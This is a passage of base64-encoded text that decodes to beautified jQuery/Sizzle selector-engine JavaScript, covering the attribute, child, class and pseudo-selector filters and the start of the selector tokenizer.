AgICAgICAgICAgICAgIHJlbGF0aXZlOiB7CiAgICAgICAgICAgICAgICAgICAgIj4iOiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGRpcjogInBhcmVudE5vZGUiLAogICAgICAgICAgICAgICAgICAgICAgICBmaXJzdDogITAKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICIgIjogewogICAgICAgICAgICAgICAgICAgICAgICBkaXI6ICJwYXJlbnROb2RlIgogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgIisiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGRpcjogInByZXZpb3VzU2libGluZyIsCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcnN0OiAhMAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgIn4iOiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGRpcjogInByZXZpb3VzU2libGluZyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgcHJlRmlsdGVyOiB7CiAgICAgICAgICAgICAgICAgICAgQVRUUjogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYVsxXSA9IGFbMV0ucmVwbGFjZShjYiwgZGIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYVszXSA9IChhWzNdIHx8IGFbNF0gfHwgYVs1XSB8fCAiIikucmVwbGFjZShjYiwgZGIpLAogICAgICAgICAgICAgICAgICAgICAgICAifj0iID09PSBhWzJdICYmIChhWzNdID0gIiAiICsgYVszXSArICIgIiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhLnNsaWNlKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBDSElMRDogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYVsxXSA9IGFbMV0udG9Mb3dlckNhc2UoKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJudGgiID09PSBhWzFdLnNsaWNlKDAsIDMpID8gKGFbM10gfHwgZ2IuZXJyb3IoYVswXSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYVs0XSA9ICsoYVs0XSA/IGFbNV0gKyAoYVs2XSB8fCAxKSA6IDIgKiAoImV2ZW4iID09PSBhWzNdIHx8ICJvZGQiID09PSBhWzNdKSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYVs1XSA9ICsoYVs3XSArIGFbOF0gfHwgIm9kZCIgPT09IGFbM10pKSA6IGFbM10gJiYgZ2IuZXJyb3IoYVswXSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBQU0VVRE86IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGIsIGMgPSAhYVs2XSAmJiBhWzJdOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gWC5DSElMRC50ZXN0KGFbMF0pID8gbnVsbCA6IChhWzNdID8gYVsyXSA9IGFbNF0gfHwgYVs1XSB8fCAiIiA6IGMgJiYgVi50ZXN0KGMpICYmIChiID0gZyhjLCAhMCkpICYmIChiID0gYy5pbmRleE9mKCIpIiwgYy5sZW5ndGggLSBiKSAtIGMubGVuZ3RoKSAmJiAoYVswXSA9IGFbMF0uc2xpY2UoMCwgYiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhWzJdID0gYy5zbGljZSgwLCBiKSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhLnNsaWNlKDAsIDMpKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBmaWx0ZXI6IHsKICAgICAgICAgICAgICAgICAgICBUQUc6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBhLnJlcGxhY2UoY2IsIGRiKS50b0xvd2VyQ2FzZSgpOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gIioiID09PSBhID8gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICEwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYS5ub2RlTmFtZSAmJiBhLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT09IGIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIENMQVNTOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiID0geVthICsgIiAiXTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGIgfHwgKGIgPSBuZXcgUmVnRXhwKCIoXnwiICsgTCArICIpIiArIGEgKyAiKCIgKyBMICsgInwkKSIpKSAmJiB5KGEsIGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBiLnRlc3QoInN0cmluZyIgPT0gdHlwZW9mIGEuY2xhc3NOYW1lICYmIGEuY2xhc3NOYW1lIHx8ICJ1bmRlZmluZWQiICE9IHR5cGVvZiBhLmdldEF0dHJpYnV0ZSAmJiBhLmdldEF0dHJpYnV0ZSgiY2xhc3MiKSB8fCAiIikKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIEFUVFI6IGZ1bmN0aW9uKGEsIGIsIGMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKGQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBlID0gZ2IuYXR0cihkLCBhKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBudWxsID09IGUgPyAiIT0iID09PSBiIDogYiA/IChlICs9ICIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICI9IiA9PT0gYiA/IGUgPT09IGMgOiAiIT0iID09PSBiID8gZSAhPT0gYyA6ICJePSIgPT09IGIgPyBjICYmIDAgPT09IGUuaW5kZXhPZihjKSA6ICIqPSIgPT09IGIgPyBjICYmIGUuaW5kZXhPZihjKSA+IC0xIDogIiQ9IiA9PT0gYiA/IGMgJiYgZS5zbGljZSgtYy5sZW5ndGgpID09PSBjIDogIn49IiA9PT0gYiA/ICgiICIgKyBlLnJlcGxhY2UoUSwgIiAiKSArICIgIikuaW5kZXhPZihjKSA+IC0xIDogInw9IiA9PT0gYiA/IGUgPT09IGMgfHwgZS5zbGljZSgwLCBjLmxlbmd0aCArIDEpID09PSBjICsgIi0iIDogITEpIDogITAKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgQ0hJTEQ6IGZ1bmN0aW9uKGEsIGIsIGMsIGQsIGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGYgPSAibnRoIiAhPT0gYS5zbGljZSgwLCAzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLCBnID0gImxhc3QiICE9PSBhLnNsaWNlKC00KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLCBoID0gIm9mLXR5cGUiID09PSBiOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gMSA9PT0gZCAmJiAwID09PSBlID8gZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAhIWEucGFyZW50Tm9kZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgOiBmdW5jdGlvbihiLCBjLCBpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGosIGssIGwsIG0sIG4sIG8sIHAgPSBmICE9PSBnID8gIm5leHRTaWJsaW5nIiA6ICJwcmV2aW91c1NpYmxpbmciLCBxID0gYi5wYXJlbnROb2RlLCByID0gaCAmJiBiLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCksIHMgPSAhaSAmJiAhaDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAocSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKHApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsID0gYjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAobCA9IGxbcF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoID8gbC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09PSByIDogMSA9PT0gbC5ub2RlVHlwZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAhMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvID0gcCA9ICJvbmx5IiA9PT0gYSAmJiAhbyAmJiAibmV4dFNpYmxpbmciCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gITAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAobyA9IFtnID8gcS5maXJzdENoaWxkIDogcS5sYXN0Q2hpbGRdLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnICYmIHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGsgPSBxW3VdIHx8IChxW3VdID0ge30pLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGogPSBrW2FdIHx8IFtdLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG4gPSBqWzBdID09PSB3ICYmIGpbMV0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbSA9IGpbMF0gPT09IHcgJiYgalsyXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsID0gbiAmJiBxLmNoaWxkTm9kZXNbbl07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAobCA9ICsrbiAmJiBsICYmIGxbcF0gfHwgKG0gPSBuID0gMCkgfHwgby5wb3AoKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoMSA9PT0gbC5ub2RlVHlwZSAmJiArK20gJiYgbCA9PT0gYikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrW2FdID0gW3csIG4sIG1dOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChzICYmIChqID0gKGJbdV0gfHwgKGJbdV0gPSB7fSkpW2FdKSAmJiBqWzBdID09PSB3KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbSA9IGpbMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIChsID0gKytuICYmIGwgJiYgbFtwXSB8fCAobSA9IG4gPSAwKSB8fCBvLnBvcCgpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoaCA/IGwubm9kZU5hbWUudG9Mb3dlckNhc2UoKSA9PT0gciA6IDEgPT09IGwubm9kZVR5cGUpICYmICsrbSAmJiAocyAmJiAoKGxbdV0gfHwgKGxbdV0gPSB7fSkpW2FdID0gW3csIG1dKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsID09PSBiKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBtIC09IGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG0gPT09IGQgfHwgbSAlIGQgPT09IDAgJiYgbSAvIGQgPj0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIFBTRVVETzogZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYywgZSA9IGQucHNldWRvc1thXSB8fCBkLnNldEZpbHRlcnNbYS50b0xvd2VyQ2FzZSgpXSB8fCBnYi5lcnJvcigidW5zdXBwb3J0ZWQgcHNldWRvOiAiICsgYSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBlW3VdID8gZShiKSA6IGUubGVuZ3RoID4gMSA/IChjID0gW2EsIGEsICIiLCBiXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnNldEZpbHRlcnMuaGFzT3duUHJvcGVydHkoYS50b0xvd2VyQ2FzZSgpKSA/IGliKGZ1bmN0aW9uKGEsIGMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGQsIGYgPSBlKGEsIGIpLCBnID0gZi5sZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIChnLS0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID0gSihhLCBmW2ddKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhW2RdID0gIShjW2RdID0gZltnXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KSA6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGUoYSwgMCwgYykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICkgOiBlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHBzZXVkb3M6IHsKICAgICAgICAgICAgICAgICAgICBub3Q6IGliKGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBbXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLCBjID0gW10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgZCA9IGgoYS5yZXBsYWNlKFIsICIkMSIpKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRbdV0gPyBpYihmdW5jdGlvbihhLCBiLCBjLCBlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgZiwgZyA9IGQoYSwgbnVsbCwgZSwgW10pLCBoID0gYS5sZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoaC0tKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChmID0gZ1toXSkgJiYgKGFbaF0gPSAhKGJbaF0gPSBmKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSkgOiBmdW5jdGlvbihhLCBlLCBmKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYlswXSA9IGEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZChiLCBudWxsLCBmLCBjKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiWzBdID0gbnVsbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAhYy5wb3AoKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSksCiAgICAgICAgICAgICAgICAgICAgaGFzOiBpYihmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmdW5jdGlvbihiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZ2IoYSwgYikubGVuZ3RoID4gMAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSksCiAgICAgICAgICAgICAgICAgICAgY29udGFpbnM6IGliKGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEgPSBhLnJlcGxhY2UoY2IsIGRiKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGIudGV4dENvbnRlbnQgfHwgYi5pbm5lclRleHQgfHwgZShiKSkuaW5kZXhPZihhKSA+IC0xCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSksCiAgICAgICAgICAgICAgICAgICAgbGFuZzogaWIoZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gVy50ZXN0KGEgfHwgIiIpIHx8IGdiLmVycm9yKCJ1bnN1cHBvcnRlZCBsYW5nOiAiICsgYSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhID0gYS5yZXBsYWNlKGNiLCBkYikudG9Mb3dlckNhc2UoKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoYyA9IHAgPyBiLmxhbmcgOiBiLmdldEF0dHJpYnV0ZSgieG1sOmxhbmciKSB8fCBiLmdldEF0dHJpYnV0ZSgibGFuZyIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGMgPSBjLnRvTG93ZXJDYXNlKCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjID09PSBhIHx8IDAgPT09IGMuaW5kZXhPZihhICsgIi0iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoKGIgPSBiLnBhcmVudE5vZGUpICYmIDEgPT09IGIubm9kZVR5cGUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAhMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgIHRhcmdldDogZnVuY3Rpb24oYikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYyA9IGEubG9jYXRpb24gJiYgYS5sb2NhdGlvbi5oYXNoOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYyAmJiBjLnNsaWNlKDEpID09PSBiLmlkCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICByb290OiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhID09PSBvCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBmb2N1czogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYSA9PT0gbi5hY3RpdmVFbGVtZW50ICYmICghbi5oYXNGb2N1cyB8fCBuLmhhc0ZvY3VzKCkpICYmICEhKGEudHlwZSB8fCBhLmhyZWYgfHwgfmEudGFiSW5kZXgpCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBlbmFibGVkOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhLmRpc2FibGVkID09PSAhMQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWQ6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEuZGlzYWJsZWQgPT09ICEwCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBjaGVja2VkOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiID0gYS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gImlucHV0IiA9PT0gYiAmJiAhIWEuY2hlY2tlZCB8fCAib3B0aW9uIiA9PT0gYiAmJiAhIWEuc2VsZWN0ZWQKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHNlbGVjdGVkOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhLnBhcmVudE5vZGUgJiYgYS5wYXJlbnROb2RlLnNlbGVjdGVkSW5kZXgsCiAgICAgICAgICAgICAgICAgICAgICAgIGEuc2VsZWN0ZWQgPT09ICEwCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBlbXB0eTogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGEgPSBhLmZpcnN0Q2hpbGQ7IGE7IGEgPSBhLm5leHRTaWJsaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGEubm9kZVR5cGUgPCA2KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAhMTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICEwCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBwYXJlbnQ6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICFkLnBzZXVkb3MuZW1wdHkoYSkKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIGhlYWRlcjogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gWi50ZXN0KGEubm9kZU5hbWUpCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBpbnB1dDogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gWS50ZXN0KGEubm9kZU5hbWUpCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBidXR0b246IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBhLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAiaW5wdXQiID09PSBiICYmICJidXR0b24iID09PSBhLnR5cGUgfHwgImJ1dHRvbiIgPT09IGIKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHRleHQ6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGI7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAiaW5wdXQiID09PSBhLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgJiYgInRleHQiID09PSBhLnR5cGUgJiYgKG51bGwgPT0gKGIgPSBhLmdldEF0dHJpYnV0ZSgidHlwZSIpKSB8fCAidGV4dCIgPT09IGIudG9Mb3dlckNhc2UoKSkKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIGZpcnN0OiBvYihmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFswXQogICAgICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgIGxhc3Q6IG9iKGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFtiIC0gMV0KICAgICAgICAgICAgICAgICAgICB9KSwKICAgICAgICAgICAgICAgICAgICBlcTogb2IoZnVuY3Rpb24oYSwgYiwgYykgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gWzAgPiBjID8gYyArIGIgOiBjXQogICAgICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgIGV2ZW46IG9iKGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgYyA9IDA7IGIgPiBjOyBjICs9IDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhLnB1c2goYyk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhCiAgICAgICAgICAgICAgICAgICAgfSksCiAgICAgICAgICAgICAgICAgICAgb2RkOiBvYihmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGMgPSAxOyBiID4gYzsgYyArPSAyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYS5wdXNoKGMpOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYQogICAgICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgIGx0OiBvYihmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGQgPSAwID4gYyA/IGMgKyBiIDogYzsgLS1kID49IDA7ICkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEucHVzaChkKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEKICAgICAgICAgICAgICAgICAgICB9KSwKICAgICAgICAgICAgICAgICAgICBndDogb2IoZnVuY3Rpb24oYSwgYiwgYykgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBkID0gMCA+IGMgPyBjICsgYiA6IGM7ICsrZCA8IGI7ICkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEucHVzaChkKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICBkLnBzZXVkb3MubnRoID0gZC5wc2V1ZG9zLmVxOwogICAgICAgIGZvciAoYiBpbiB7CiAgICAgICAgICAgIHJhZGlvOiAhMCwKICAgICAgICAgICAgY2hlY2tib3g6ICEwLAogICAgICAgICAgICBmaWxlOiAhMCwKICAgICAgICAgICAgcGFzc3dvcmQ6ICEwLAogICAgICAgICAgICBpbWFnZTogITAKICAgICAgICB9KQogICAgICAgICAgICBkLnBzZXVkb3NbYl0gPSBtYihiKTsKICAgICAgICBmb3IgKGIgaW4gewogICAgICAgICAgICBzdWJtaXQ6ICEwLAogICAgICAgICAgICByZXNldDogITAKICAgICAgICB9KQogICAgICAgICAgICBkLnBzZXVkb3NbYl0gPSBuYihiKTsKICAgICAgICBmdW5jdGlvbiBxYigpIHt9CiAgICAgICAgcWIucHJvdG90eXBlID0gZC5maWx0ZXJzID0gZC5wc2V1ZG9zLAogICAgICAgICAgICBkLnNldEZpbHRlcnMgPSBuZXcgcWIsCiAgICAgICAgICAgIGcgPSBnYi50b2tlbml6ZSA9IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgIHZhciBjLCBlLCBmLCBnLCBoLCBpLCBqLCBrID0gelthICsgIiAiXTsKICAgICAgICAgICAgICAgIGlmIChrKQogICAgICAgICAgICAgICAgICAgIHJldHVybiBiID8gMCA6IGsuc2xpY2UoMCk7CiAgICAgICAgICAgICAgICBoID0gYSwKICAgICAgICAgICAgICAgICAgICBpID0gW10sCiAgICAgICAgICAgICAgICAgICAgaiA9IGQucHJlRmlsdGVyOwogICAgICAgICAgICAgICAgd2hpbGUgKGgpIHsKICAgICAgICAgICAgICAgICAgICAoIWMgfHwgKGUgPSBTLmV4ZWMoaCkpKSAmJiAoZSAmJiAoaCA9IGguc2xpY2UoZVswXS5sZW5ndGgpIHx8IGgpLAogICAgICAgICAgICAgICAgICAgICAgICBpLnB1c2goZiA9IFtdKSksCiAgICAgICAgICAgICAgICAgICAgICAgIGMgPSAhMSwKICAgICAgICAgICAgICAgICAgICAoZSA9IFQuZXhlYyhoKSkgJiYgKGMgPSBlLnNoaWZ0KCksCiAgICAgICAgICAgICAgICAgICAgICAgIGYucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogYywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6IGVbMF0ucmVwbGFjZShSLCAiICIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgICAgICBoID0gaC5zbGljZShjLmxlbmd0aCkpOwogICAgICAgICAgICAgICAgICAgIGZvciAoZyBpbiBkLmZpbHRlcikKICAgICAgICAgICAgICAgICAgICAgICAgIShlID0gWFtnXS5leGVjKGgpKSB8fCBqW2ddICYmICEoZSA9IGpbZ10oZSkpIHx8IChjID0gZS5zaGlmdCgpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZi5wdXNoKHsKICAg